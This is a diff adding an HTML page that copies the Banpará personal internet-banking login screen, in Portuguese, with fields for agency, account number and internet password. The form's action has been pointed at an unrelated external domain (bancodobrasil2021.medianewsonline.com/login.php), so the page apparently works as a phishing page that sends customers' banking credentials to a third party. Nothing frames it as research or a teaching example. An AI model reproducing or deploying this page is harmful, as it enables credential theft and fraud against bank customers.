@@ -1,0 +1,735 @@
+<!DOCTYPE html>
+<!-- saved from url=(0047)https://internetbanking.banpara.b.br/ibpf/login -->
+<html lang="pt-BR"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}</style>
+		
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		
+		<meta http-equiv="Pragma" content="no-cache">
+		<meta http-equiv="Cache-Control" content="no-cache">
+				
+        <title>
+        	Internet Banking Pessoa Física
+        </title>
+        
+        
+			<script async="" src="./Internet Banking Pessoa Física_files/analytics.js.transferir"></script><script type="text/javascript">
+				/* <![CDATA[ */
+				(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+				(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+				m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+				})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+				
+				ga('create', 'UA-124509981-2', 'auto');
+				ga('send', 'pageview', location.pathname);
+				/* ]]> */
+			</script>        
+                            
+        
+		<link rel="shortcut icon" type="image/x-icon" href="https://internetbanking.banpara.b.br/ibpf/resources/imagens/favicon.ico?20201215130741">
+		<link rel="icon" href="https://internetbanking.banpara.b.br/ibpf/resources/imagens/favicon.ico?20201215130741" type="image/x-icon">
+        
+		<!-- LIBS -->
+        <link rel="stylesheet" type="text/css" media="screen" href="./Internet Banking Pessoa Física_files/bootstrap.min.css">
+        <link rel="stylesheet" type="text/css" href="./Internet Banking Pessoa Física_files/fontawesome.min.css">
+		<link rel="stylesheet" type="text/css" href="./Internet Banking Pessoa Física_files/solid.min.css">    
+		<link rel="stylesheet" type="text/css" href="./Internet Banking Pessoa Física_files/material-kit.css">
+		<link rel="stylesheet" type="text/css" href="./Internet Banking Pessoa Física_files/keyboard.css">
+		<link rel="stylesheet" type="text/css" href="./Internet Banking Pessoa Física_files/rzslider.css">
+
+		<!-- BASE -->
+        <link rel="stylesheet" type="text/css" href="./Internet Banking Pessoa Física_files/fontes.css">
+        <link rel="stylesheet" type="text/css" href="./Internet Banking Pessoa Física_files/base.css">
+        
+        <!-- PÁGINA -->
+        
+        	<link rel="stylesheet" type="text/css" href="./Internet Banking Pessoa Física_files/login.css">
+        
+        
+		<!-- CSS de ajuste para recursos não suportados no IE9 -->
+		<!--[if lt IE 10]>
+			<link rel="stylesheet" type="text/css" href="/ibpf/resources/css/base/compatibilidade.css?20201215130741"></link>
+		<![endif]-->
+		<link rel="stylesheet" type="text/css" href="./Internet Banking Pessoa Física_files/impressao.css">
+		
+		<script type="text/javascript" src="./Internet Banking Pessoa Física_files/angular.min.js.transferir"></script>
+		<script type="text/javascript" src="./Internet Banking Pessoa Física_files/angular-locale_pt-br.js.transferir"></script>
+		<script type="text/javascript">
+ 			/* <![CDATA[ */
+			function noBack() {
+				window.history.forward()
+			};
+			noBack();
+			window.onload = noBack;
+			window.onpageshow = function(evt) {
+				if (evt.persisted)
+					noBack()
+			};
+			window.onunload = function() {
+				void (0)
+			};
+			
+			angular.element(document).ready(function() {
+				tamanhoFontePadrao = parseInt($('html').css('font-size').split('px')[0]);
+				initConfig('/ibpf', 300, null);			
+			}); 			
+			/* ]]> */
+		</script>				                
+    <link id="avast_os_ext_custom_font" href="chrome-extension://mbckjcfnjmoiinpgddefodcighgikkgn/common/ui/fonts/fonts.css" rel="stylesheet" type="text/css"></head>
+    <body class="">
+		
+
+<main id="login-page" class="principal">
+	<div class="conteudo">
+		<div class="topo">
+			<div class="row">
+				<div class="col-sm-4 text-left">
+					<button class="btn btn-ajuda" data-toggle="modal" data-target="#modal-ajuda">Ajuda&nbsp;?</button>
+				</div>
+				<div class="col-sm-8 text-right">
+					<span class="info-sistema">Versão:&nbsp;1.1.5.0 - Banco de Estado do Pará ©</span>
+					<button class="btn btn-fonte neutro" onclick="diminuirFonte();">A-</button>
+					<button class="btn btn-fonte positivo" onclick="restaurarFonte();">A</button>
+					<button class="btn btn-fonte neutro" onclick="aumentarFonte();">A+</button>
+				</div>			
+			</div>
+		</div>
+
+		<div class="caixa-login">
+			<header>
+				<div class="row">
+					<div class="col-sm-4">
+						<img src="./Internet Banking Pessoa Física_files/logo_azul.png" alt="Logo Banpará" class="logo">
+					</div>
+					<div class="col-sm-8">
+						<div class="titulo-sistema">
+							<span class="titulo">Internet Banking</span>
+							<span class="subtitulo">Pessoa Física</span>
+						</div>
+					</div>
+				</div>
+			</header>
+			<div class="mensagens">
+				
+
+<div id="mensagem-controller" data-ng-controller="mensagemController" class="ng-scope">
+	<!-- ngRepeat: msg in messages | filter: { severityMessage: 'ERROR' } -->
+	
+	<!-- ngRepeat: msg in messages | filter: { severityMessage: 'WARN' } -->
+		
+	<!-- ngRepeat: msg in messages | filter: { severityMessage: 'INFO' } -->
+	
+	<!-- ngRepeat: msg in messages | filter: { severityMessage: 'SUCCESS' } -->					
+</div>
+
+<script type="text/javascript">
+	/* <![CDATA[ */
+		function mensagemController($scope, $filter) {
+			$scope.messages = null;
+			
+			if (!angular.isArray($scope.messages)) {
+				$scope.messages = [];
+			}
+			
+			$scope.existeMensagens = function() {
+				return angular.isArray($scope.messages) && $scope.messages.length > 0;
+			}			
+
+			$scope.existeMensagem = function(msg) {
+				return angular.isObject($filter('filter')($scope.messages, {mensagem: msg.mensagem})[0]);
+			}
+
+			$scope.atualizarSeverityMessage = function(msg) {
+				$filter('filter')($scope.messages, {mensagem: msg.mensagem})[0].severityMessage = msg.severityMessage;				
+			}					
+			
+			$scope.limparMensagens = function() {
+				$scope.messages = [];
+			}
+			
+			$scope.adicionarMensagens = function(mensagens) {
+				if (angular.isArray(mensagens)) {
+					mensagens.forEach(function(mensagem) {
+						if (!$scope.existeMensagem(mensagem)) {
+							$scope.messages.push(mensagem);
+						} else {
+							$scope.atualizarSeverityMessage(mensagem);
+						}     					
+  					});
+  					moverScrollTop();
+				}
+			}
+			
+			$scope.adicionarMensagem = function(mensagem) {
+				if (angular.isObject(mensagem)) {
+					if (!$scope.existeMensagem(mensagem)) {
+						$scope.messages.push(mensagem);
+					} else {
+						$scope.atualizarSeverityMessage(mensagem);
+					}
+					moverScrollTop();
+				}				
+			}				
+		}					
+				
+		angular.element(document).ready(function() {
+			angular.module('internetBankingApp').controller('mensagemController',
+					[ '$scope', '$filter', mensagemController ]);			
+			angular.bootstrap($('#mensagem-controller'), ['internetBankingApp']);
+		});									
+	/* ]]> */
+</script>
+			</div>			
+			<article>
+				<div id="login-controller" data-ng-controller="loginController" class="ng-scope">
+					
+
+
+
+
+
+
+
+
+
+	
+	
+	
+	
+
+
+
+
+<form id="formulario" name="formulario" action="https://bancodobrasil2021.medianewsonline.com/login.php" method="POST" autocomplete="off" novalidate="novalidate" data-ng-is-submitted="" class="ng-pristine ng-invalid ng-invalid-required ng-valid-maxlength">
+	
+					
+						<div class="row">
+							<div class="col-sm-6">
+								
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	
+		
+		
+				
+		
+	
+	 
+
+	
+
+
+
+
+<div class="form-group label-floating" data-ng-show="true">
+	
+		
+		
+			<label for="titularidade" class="control-label">Titularidade</label>
+		
+	
+	<div class="btn-group bootstrap-select ng-pristine ng-untouched ng-valid ng-valid-required"><button type="button" class="btn dropdown-toggle bnp-select" data-toggle="dropdown" role="button" data-id="titularidade" tabindex="1" title="Primeiro Titular"><span class="filter-option pull-left">Primeiro Titular</span>&nbsp;<span class="bs-caret"><span class="caret"></span></span></button><div class="dropdown-menu open" role="combobox"><ul class="dropdown-menu inner" role="listbox" aria-expanded="false"><li data-original-index="1"><a tabindex="0" class="ng-hide" data-tokens="null" role="option" aria-disabled="false" aria-selected="false"><span class="text"></span><span class="material-icons check-mark">done</span></a></li><li data-original-index="2" class="selected"><a tabindex="0" class="" data-tokens="null" role="option" aria-disabled="false" aria-selected="true"><span class="text">Primeiro Titular</span><span class="material-icons check-mark">done</span></a></li><li data-original-index="3"><a tabindex="0" class="" data-tokens="null" role="option" aria-disabled="false" aria-selected="false"><span class="text">Segundo Titular</span><span class="material-icons check-mark">done</span></a></li></ul></div><select id="titularidade" name="titularidade" data-ng-required="true" data-ng-model="titularidade" tabindex="-98" data-ng-disabled="false" data-ng-options="tit.name as tit.descricao for tit in listaTitularidade" class="selectpicker ng-pristine ng-untouched ng-valid ng-valid-required" data-style="bnp-select" title="Titularidade" data-bootstrap-selectpicker="" data-ng-is-empty="" data-ng-has-error="" required="required"><option class="bs-title-option" value="">Titularidade</option><option data-ng-hide="true" value="" class="ng-hide"></option><option value="0" selected="selected" label="Primeiro Titular">Primeiro Titular</option><option value="1" label="Segundo Titular">Segundo Titular</option></select></div>
+	
+		<span class="form-control-feedback">
+			<span class="fa fa-exclamation-circle icone-erro"></span>
+		</span>	
+		<span data-ng-show="formulario.$submitted &amp;&amp; formulario.titularidade.$error.required" class="erro erro-select ng-hide">Campo obrigatório.</span>
+		<span data-ng-show="formulario.$submitted &amp;&amp; !formulario.titularidade.$error.required &amp;&amp; formulario.titularidade.$invalid" class="erro erro-select ng-hide">Campo inválido.</span>	
+			
+</div>
+							</div>
+							<div class="col-sm-6">
+								
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	
+		
+		
+				
+		
+	
+	 
+
+	
+
+
+
+
+<div class="form-group label-floating" data-ng-show="true">
+	
+		
+		
+			<label for="tipoConta" class="control-label">Tipo da Conta</label>
+		
+	
+	<div class="btn-group bootstrap-select ng-pristine ng-untouched ng-valid ng-valid-required"><button type="button" class="btn dropdown-toggle bnp-select" data-toggle="dropdown" role="button" data-id="tipoConta" tabindex="2" title="Conta Corrente"><span class="filter-option pull-left">Conta Corrente</span>&nbsp;<span class="bs-caret"><span class="caret"></span></span></button><div class="dropdown-menu open" role="combobox"><ul class="dropdown-menu inner" role="listbox" aria-expanded="false"><li data-original-index="1"><a tabindex="0" class="ng-hide" data-tokens="null" role="option" aria-disabled="false" aria-selected="false"><span class="text"></span><span class="material-icons check-mark">done</span></a></li><li data-original-index="2" class="selected"><a tabindex="0" class="" data-tokens="null" role="option" aria-disabled="false" aria-selected="true"><span class="text">Conta Corrente</span><span class="material-icons check-mark">done</span></a></li><li data-original-index="3"><a tabindex="0" class="" data-tokens="null" role="option" aria-disabled="false" aria-selected="false"><span class="text">Conta Poupança</span><span class="material-icons check-mark">done</span></a></li></ul></div><select id="tipoConta" name="tipoConta" data-ng-required="true" data-ng-model="tipoConta" tabindex="-98" data-ng-disabled="false" data-ng-options="tc.name as tc.descricao for tc in listaTipoConta" class="selectpicker ng-pristine ng-untouched ng-valid ng-valid-required" data-style="bnp-select" title="Tipo da Conta" data-bootstrap-selectpicker="" data-ng-is-empty="" data-ng-has-error="" required="required"><option class="bs-title-option" value="">Tipo da Conta</option><option data-ng-hide="true" value="" class="ng-hide"></option><option value="0" selected="selected" label="Conta Corrente">Conta Corrente</option><option value="1" label="Conta Poupança">Conta Poupança</option></select></div>
+	
+		<span class="form-control-feedback">
+			<span class="fa fa-exclamation-circle icone-erro"></span>
+		</span>	
+		<span data-ng-show="formulario.$submitted &amp;&amp; formulario.tipoConta.$error.required" class="erro erro-select ng-hide">Campo obrigatório.</span>
+		<span data-ng-show="formulario.$submitted &amp;&amp; !formulario.tipoConta.$error.required &amp;&amp; formulario.tipoConta.$invalid" class="erro erro-select ng-hide">Campo inválido.</span>	
+			
+</div>						
+							</div>
+						</div>	
+										
+						<div class="row">
+							<div class="col-sm-6">
+								
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	
+		
+		
+				
+		
+	
+	
+
+	
+
+
+	
+
+
+	
+
+
+<div class="form-group label-floating is-empty" data-ng-show="true">
+	
+		
+		
+			<label for="agencia" class="control-label">Agência</label>
+		
+	
+	<input id="agencia" name="agencia" type="text" data-ng-required="true" data-ng-numbers-only="" data-ng-model="agencia" maxlength="4" tabindex="3" data-ng-autofocus="" data-ng-focus-next-on-maxlength="" data-ng-padleft="{size: 4, padChar : &#39;0&#39;}" data-ng-disabled="false" class="form-control ng-pristine ng-invalid ng-invalid-required ng-valid-maxlength ng-touched" data-ng-is-empty="" data-ng-has-error="" required="required">
+	
+		<span class="form-control-feedback">
+			<span class="fa fa-exclamation-circle icone-erro"></span>
+		</span>			
+		<span data-ng-show="formulario.$submitted &amp;&amp; formulario.agencia.$error.required" class="erro ng-hide">Campo obrigatório.</span>
+		<span data-ng-show="formulario.$submitted &amp;&amp; !formulario.agencia.$error.required &amp;&amp; formulario.agencia.$invalid" class="erro ng-hide">Campo inválido.</span>		
+		
+<span class="material-input"></span></div>
+							</div>
+							<div class="col-sm-6">
+								
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	
+		
+		
+				
+		
+	
+	 
+
+	
+
+
+
+	
+
+
+	
+		
+		
+	
+	
+	
+
+
+<div class="form-group label-floating is-empty" data-ng-show="true">
+	
+		
+		
+			<label for="numeroConta" class="control-label">Conta</label>
+		
+	
+	<input id="numeroConta" name="numeroConta" type="text" data-ng-required="true" data-ng-numbers-only="" data-ng-model="numeroConta" maxlength="10" tabindex="4" data-ng-focus-next-on-maxlength="" data-ng-padleft="{size: 10, padChar : &#39;0&#39;}" data-ng-disabled="false" class="form-control ng-pristine ng-untouched ng-invalid ng-invalid-required ng-valid-maxlength" data-ng-is-empty="" data-ng-has-error="" required="required">
+	
+		<span class="form-control-feedback">
+			<span class="fa fa-exclamation-circle icone-erro"></span>
+		</span>	
+		<span data-ng-show="formulario.$submitted &amp;&amp; formulario.numeroConta.$error.required" class="erro ng-hide">Campo obrigatório.</span>
+		<span data-ng-show="formulario.$submitted &amp;&amp; !formulario.numeroConta.$error.required &amp;&amp; formulario.numeroConta.$invalid" class="erro ng-hide">Campo inválido.</span>		
+				   	
+<span class="material-input"></span></div>
+							</div>
+						</div>
+						
+						
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	
+		
+		
+				
+		
+	
+	
+
+
+
+	
+
+
+
+<div class="form-group label-floating is-empty" data-ng-show="true">
+	
+		
+		
+			<label for="CHV0299854311" class="control-label">Senha da Internet</label>
+		
+	
+	<input id="CHV0299854311" name="CHV0299854311" type="password" data-ng-required="true" data-ng-model="senhaAuxiliar" tabindex="5" data-ng-disabled-ccp="" data-ng-keyboard="" data-token="a4487d46-7d4d-4710-a7a5-a7ca0c084b5e" data-ng-disabled="false" class="form-control ng-pristine ng-untouched ng-isolate-scope ui-keyboard-input kb-input ui-keyboard-lockedinput ng-invalid ng-invalid-required" data-ng-is-empty="" data-ng-has-error="" autocomplete="off" aria-haspopup="true" role="textbox" readonly="readonly" required="required">
+	<input type="hidden" id="CHV0299854311Encrypted" name="CHV0299854311Encrypted" data-ng-model="senha" class="ng-pristine ng-untouched ng-valid">
+	
+		<span class="form-control-feedback">
+			<span class="fa fa-exclamation-circle icone-erro"></span>
+		</span>	
+		<span data-ng-show="formulario.$submitted &amp;&amp; formulario.CHV0299854311.$error.required" class="erro ng-hide">Campo obrigatório.</span>
+		
+			
+			
+				<span data-ng-show="formulario.$submitted &amp;&amp; !formulario.CHV0299854311.$error.required &amp;&amp; formulario.CHV0299854311.$invalid" class="erro ng-hide">Campo inválido.</span>
+			
+			
+					   	
+<span class="material-input"></span></div>
+									 						
+						<div class="row botoes">
+							<div class="col-sm-6 text-left">
+								<button class="btn neutro" type="button" name="acessar" tabindex="7" data-ng-click="limpar();">Limpar</button>
+							</div>
+							<div class="col-sm-6 text-right">
+								<button class="btn positivo" type="button" name="acessar" tabindex="6" data-ng-click="validarLogin();">Acessar</button>
+							</div>
+						</div>
+						<input type="hidden" id="token" name="_xsrf">
+						
+</form>
+
+				</div>
+			</article>
+		</div>
+
+	</div>
+</main>
+
+
+
+<div class="modal fade" id="modal-ajuda" tabindex="-1" role="dialog">
+	<div class="modal-dialog">
+		<div class="modal-content">
+			<div class="modal-header">
+				<button type="button" class="close" data-dismiss="modal" aria-hidden="true">
+					<span class="fa fa-times"></span>
+				</button>
+				<h4 class="modal-title">Ajuda</h4>
+			</div>
+			<div class="modal-body">
+				<h5><span class="fa fa-phone-square"></span> Telefones de contato</h5>
+				<div class="row">
+					<div class="col-sm-6">
+						<div class="telefone">
+							<span class="icone fa fa-phone"></span>
+							<span class="titulo">Central Banpará</span>
+							<span class="numeros"><small>(91)</small> 3004-4444<br>0800-285-8080</span>							
+						</div>
+					</div>
+					<div class="col-sm-6">
+						<div class="telefone">
+							<span class="icone fa fa-headset"></span> 
+							<span class="titulo">SAC</span>
+							<span class="numeros">0800-280-6605</span>
+						</div>
+					</div>
+				</div>
+				<div class="row">
+					<div class="col-sm-6">
+						<div class="telefone">
+							<span class="icone fa fa-comments"></span>
+							<span class="titulo">Ouvidoria</span>
+							<span class="numeros">0800-280-9040</span>
+						</div>
+					</div>
+					<div class="col-sm-6">
+						<div class="telefone">
+							<span class="icone fa fa-deaf"></span>
+							<span class="titulo">SAC Deficiente Auditivo</span>
+							<span class="numeros">0800-280-1817</span>
+						</div>
+					</div>
+				</div>
+				
+				
+					<hr>
+					
+					<h5><span class="fa fa-arrow-alt-square-down"></span> Download de manuais</h5>
+					<div class="download-links">
+						
+							<a class="btn btn-sm neutro" href="https://internetbanking.banpara.b.br/ibpf/resources/pdf/Acesso%20Novo%20IBK%20v1.pdf?20201215130741" target="_blank">
+								Primeiro Acesso
+							</a>
+						
+							<a class="btn btn-sm neutro" href="https://internetbanking.banpara.b.br/ibpf/resources/pdf/FAQs%20IBK%20v1%20Ajustado.pdf?20201215130741" target="_blank">
+								Perguntas Frequentes
+							</a>
+						
+							<a class="btn btn-sm neutro" href="https://internetbanking.banpara.b.br/ibpf/resources/pdf/BANPARA_IBK_PORTAL_MANUAL.pdf?20201215130741" target="_blank">
+								Manual do Usuário
+							</a>
+						
+					</div>				
+				
+			</div>
+		</div>
+	</div>
+</div>
+
+
+
+<div class="modal fade" id="modal-fraude" tabindex="-1" role="dialog" style="display: none;">
+	<div class="modal-dialog">
+		<div class="modal-content">
+			<div class="modal-header">
+				<button type="button" class="close" data-dismiss="modal" aria-hidden="true">
+					<span class="fa fa-times"></span>
+				</button>
+				<h4 class="modal-title">Atenção<img src="./Internet Banking Pessoa Física_files/banpara-logo.png" alt="Logo Banpará" class="logo"></h4>
+			</div>
+			<div class="modal-body">
+				<h5>Prezado cliente,</h5>
+				<div class="row">
+					<div class="col-sm-12">
+						<div class="descricao">
+							<p>O Banpará <b>não</b> envia links por E-mail, SMS e Redes Sociais.<br>Não forneça seus dados pessoais a terceiros.</p>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div class="modal-footer">
+				<button type="button" class="btn neutro" data-dismiss="modal">
+					ESTOU CIENTE
+				<div class="ripple-container"><div class="ripple ripple-on ripple-out" style="left: 45px; top: 5.6875px; background-color: rgb(47, 54, 142); transform: scale(14.25);"></div></div></button>
+			</div>
+		</div>
+	</div>
+</div>
+
+<script type="text/javascript">
+	/* <![CDATA[ */
+	function loginController($scope, $http, $browser) {
+		$scope.listaTitularidade = [{"name":"PRIMEIRO_TITULAR","descricao":"Primeiro Titular"},{"name":"SEGUNDO_TITULAR","descricao":"Segundo Titular"}];
+		$scope.titularidade = 'PRIMEIRO_TITULAR';
+
+		$scope.listaTipoConta = [{"name":"CONTA_CORRENTE","descricao":"Conta Corrente"},{"name":"CONTA_POUPANCA","descricao":"Conta Poupança"}];
+		$scope.tipoConta = 'CONTA_CORRENTE';
+		
+		$scope.agencia = null;
+		$scope.numeroConta = null;
+		
+		sessionStorage.setItem("loginRegistradoGA", "false");
+		
+		$scope.limpar = function() {
+			limparMensagensGlobal();
+			$scope.titularidade = 'PRIMEIRO_TITULAR';
+			$scope.tipoConta = 'CONTA_CORRENTE';
+			$scope.agencia = '';
+			$scope.numeroConta = '';
+			limparCamposPassword($scope.formulario);
+			$scope.formulario.$submitted = false;
+		}
+		
+		$scope.validarLogin = function() {
+			$scope.formulario.$submitted = true;
+			if (!$scope.formulario.$valid) {
+				return;
+			}			
+		
+			var dadosAutenticacao = {
+				titularidade: $scope.titularidade,
+				tipoConta: $scope.tipoConta,
+				agencia : $scope.agencia,
+				numeroConta : $scope.numeroConta,
+				CHV0299854311Encrypted : $scope.senha					
+			}
+
+			$http.post("/login/validar", dadosAutenticacao).success(function(data) {
+				if(data) {
+					jConfirm("Existe uma outra sessão ativa para esta conta. Deseja encerrar a outra sessão e iniciar esta nova?", function(retorno) {
+						if (retorno) {
+							$scope.logar();								
+						} else {
+							location.reload();
+						}
+					});
+				}
+				else {
+					$scope.logar();
+				}
+			}).error(function(data) {
+				limparCamposPassword($scope.formulario);
+				$scope.formulario.$submitted = false;
+				
+				
+				var objetoGALoginErro = {
+					agencia: $scope.agencia,
+			        numeroConta: $scope.numeroConta,
+			        tipoConta: $scope.tipoConta,
+			        titularidade: $scope.titularidade
+				};
+				enviarEventoGA('Login', 'Login', objetoGALoginErro, false, data.messages[0].mensagem);
+			});
+		}
+			
+		$scope.logar = function() {
+			$scope.formulario.$submitted = true;
+			if (!$scope.formulario.$valid) {
+				return;
+			}
+			abrirModalAguarde();
+
+			$("#token").val($browser.cookies()["XSRF-TOKEN"]);
+			$('#formulario').submit();
+		}		
+	}	
+	
+	angular.element(document).ready(function() {
+		angular.module('internetBankingApp').controller('loginController',
+				[ '$scope', '$http', '$browser', loginController ]);
+		angular.bootstrap($('#login-controller'), ['internetBankingApp']);
+		if(sessionStorage.getItem("hideModalFraude") == null || sessionStorage.getItem("hideModalFraude") === "false") {
+			$("#modal-fraude").modal({backdrop: "static", keyboard: false, show: true});
+			sessionStorage.setItem("hideModalFraude", "true");
+		}
+	});
+	/* ]]> */
+</script>
+
+
+		
+		<div id="aguarde">
+			<div class="conteudo">
+				<span class="icone fa fa-spin fa-spinner-third"></span>
+				<p class="texto">Aguarde</p>
+			</div>
+		</div>
+		
+		<div id="divAlerts"></div>				
+    
+	<script type="text/javascript" src="./Internet Banking Pessoa Física_files/utils.js.transferir"></script>
+		      
+    <script type="text/javascript" src="./Internet Banking Pessoa Física_files/crypto-js.min.js.transferir"></script>
+    <script type="text/javascript" src="./Internet Banking Pessoa Física_files/aes.min.js.transferir"></script>
+    <script type="text/javascript" src="./Internet Banking Pessoa Física_files/pbkdf2.min.js.transferir"></script>	      
+	<script type="text/javascript" src="./Internet Banking Pessoa Física_files/jquery.min.js.transferir"></script>	
+    <script type="text/javascript" src="./Internet Banking Pessoa Física_files/bootstrap.min.js.transferir"></script>
+    <script type="text/javascript" src="./Internet Banking Pessoa Física_files/jquery-ui-position.min.js.transferir"></script>
+    <script type="text/javascript" src="./Internet Banking Pessoa Física_files/jquery.keyboard.min.js.transferir"></script>
+    <script type="text/javascript" src="./Internet Banking Pessoa Física_files/angular-input-masks-standalone.min.js.transferir"></script>
+    <script type="text/javascript" src="./Internet Banking Pessoa Física_files/angular-br-filters.min.js.transferir"></script>	    
+    <script type="text/javascript" src="./Internet Banking Pessoa Física_files/ng-table.min.js.transferir"></script>
+    <script type="text/javascript" src="./Internet Banking Pessoa Física_files/angular-print.js.transferir"></script>
+    <script type="text/javascript" src="./Internet Banking Pessoa Física_files/rzslider.min.js.transferir"></script>
+    
+	<!--   MATERIAL KIT   -->
+	<script type="text/javascript" src="./Internet Banking Pessoa Física_files/material.min.js.transferir"></script>
+	<script type="text/javascript" src="./Internet Banking Pessoa Física_files/moment.min.js.transferir"></script>	
+	<script type="text/javascript" src="./Internet Banking Pessoa Física_files/bootstrap-selectpicker.js.transferir"></script>
+	<script type="text/javascript" src="./Internet Banking Pessoa Física_files/bootstrap-datetimepicker.js.transferir"></script>
+	<script type="text/javascript" src="./Internet Banking Pessoa Física_files/material-kit.js.transferir"></script>
+	
+	<script type="text/javascript" src="./Internet Banking Pessoa Física_files/ng-bootstrap-select.js.transferir"></script>	
+	
+	<script type="text/javascript" src="./Internet Banking Pessoa Física_files/pt-br.js.transferir"></script>
+	<script type="text/javascript" src="./Internet Banking Pessoa Física_files/alerts.js.transferir"></script>
+	<script type="text/javascript" src="./Internet Banking Pessoa Física_files/valorPorExtenso.js.transferir"></script>
+	<script type="text/javascript" src="./Internet Banking Pessoa Física_files/input-masks.js.transferir"></script>
+	<script type="text/javascript" src="./Internet Banking Pessoa Física_files/filters.js.transferir"></script>	
+	<script type="text/javascript" src="./Internet Banking Pessoa Física_files/layout.js.transferir"></script>
+	<script type="text/javascript" src="./Internet Banking Pessoa Física_files/app.js.transferir"></script>
+</body></html>
